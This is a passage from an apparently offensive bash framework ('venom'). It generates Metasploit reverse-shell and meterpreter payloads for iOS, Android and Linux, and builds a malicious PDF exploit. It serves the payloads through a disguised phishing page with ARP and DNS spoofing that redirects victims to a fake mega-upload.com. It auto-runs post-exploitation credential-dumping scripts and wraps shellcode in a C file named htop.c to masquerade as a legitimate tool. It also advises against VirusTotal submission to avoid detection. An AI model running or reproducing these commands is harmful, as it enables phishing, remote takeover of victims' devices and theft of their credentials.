rm $ApAcHe/$N4m.apk > /dev/null 2>&1
rm $IPATH/output/.apk > /dev/null 2>&1
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_android_menu
  clear
fi
}





#
# IOS payload | macho
#
sh_macho () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "osx/armle/shell_reverse_tcp" FALSE "osx/x64/meterpreter/reverse_tcp" FALSE "apple_ios/aarch64/meterpreter_reverse_tcp" --width 400 --height 250) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: IosPayload" --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="IosPayload";fi

echo "[☠] Building shellcode -> MACHO format .."
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : MACHO -> IOS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f macho > $IPATH/output/$N4m.macho"
sleep 2
echo "[☠] armle payload build (IOS)."
sleep 1
echo "[☠] Give execution permitions to agent .."
chmod +x $IPATH/output/$N4m.macho > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.macho\n\nchose how to deliver: $N4m.macho" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2

   else

      # edit files nedded
      echo "[☠] copy files to webroot..."
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.macho|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.macho $ApAcHe/$N4m.macho > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.macho|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.macho $ApAcHe/$N4m.macho
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.macho > /dev/null 2>&1
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_android_menu
  clear
fi
}




# -----------------------------
# Android PDF payload 
# ----------------------------- 
sh_android_pdf () {

# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ FILENAME ☠" --text "Enter payload output name\nexample: vacations" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="vacations";fi

echo "[☠] Building shellcode -> Android ARM format ..."
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : Android ARM -> ANDROID
    PAYLOAD : android/meterpreter/reverse_tcp

!

# use metasploit to build shellcode (msf encoded)
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/android/fileformat/adobe_reader_pdf_js_interface; set LHOST $lhost; set LPORT $lport; set FILENAME $N4m.pdf; exploit; exit -y'"
mv ~/.msf4/local/$N4m.pdf $IPATH/output/$N4m.pdf
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.pdf\n\nchose how to deliver: $N4m.pdf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2

   else

      # edit files nedded
      echo "[☠] copy files to webroot..."
      cd $IPATH/output
      zip $N4m.zip $N4m.pdf > /dev/null 2>&1
      cd $IPATH
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.zip|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.zip $ApAcHe/$N4m.zip
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/output/my-release-key.Keystore > /dev/null 2>&1
rm $IPATH/output//$N4m.zip > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_android_menu
  clear
fi
}




#
# ELF agent (linux systems)
#
sh_elf () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x86/meterpreter_reverse_https" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" FALSE "linux/x64/meterpreter/reverse_https" FALSE "linux/x64/meterpreter_reverse_https" --width 400 --height 440) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: ElfPayload" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="ElfPayload";fi

echo "[☠] Building shellcode -> ELF format .."
sleep 2
if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : ELF -> LINUX
    PAYLOAD : $paylo

!
sleep 1
# use metasploit to build shellcode (msf encoded)
echo "[☠] Using msfvenom to build agent .."
sleep 2
# if payload sellected its == then trigger SSL support
if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f elf > $IPATH/output/$N4m.elf"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f elf > $IPATH/output/$N4m.elf"
fi

sleep 2
echo "[☠] Give execution permitions to agent .."
sleep 1
chmod +x $IPATH/output/$N4m.elf > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.elf\n\nchose how to deliver: $N4m.elf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2

   else

# post-exploitation
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" FALSE "exploit_suggester.rc" --width 305 --height 260) > /dev/null 2>&1


if [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo "[✔] linux_hostrecon.rb -> found"
    sleep 2
  else
    echo "[x] linux_hostrecon.rb -> not found"
    sleep 1
    echo "[*] copy post-module to msfdb .."
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


      # edit files nedded
      echo "[☠] copy files to webroot..."
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.elf|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.elf $ApAcHe/$N4m.elf > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.elf|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.elf $ApAcHe/$N4m.elf
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
          else

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.elf > /dev/null 2>&1
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_unix_menu
  clear
fi
}



#
# DEBIAN agent (linux systems)
#
sh_debian () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" --width 400 --height 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ LOGFILE NAME ☠" --text "Enter logfile output name\nexample: DebMasquerade" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="DebMasquerade";fi

echo "[☠] Building shellcode -> C format .."
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : C -> LINUX
    PAYLOAD : $paylo

!
sleep 1
# use metasploit to build shellcode (msf encoded)
echo "[☠] Using msfvenom to build raw shellcode .."
sleep 2
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw"


echo "[☠] Parsing shellcode data .."
sleep 1
parse=$(cat $IPATH/output/chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
echo ""
echo "unsigned char buf[] ="
echo "$parse"



# ----------------
# BUILD C PROGRAM
# ----------------
cd $IPATH/output
echo "#include<stdio.h>" > htop.c
echo "#include<stdlib.h>" >> htop.c
echo "#include<string.h>" >> htop.c
echo "#include<sys/types.h>" >> htop.c
echo "#include<sys/wait.h>" >> htop.c
echo "#include<unistd.h>" >> htop.c
echo "" >> htop.c
echo "/*" >> htop.c
echo "Author: r00t-3xp10it" >> htop.c
echo "Framework: venom v1.0.17" >> htop.c
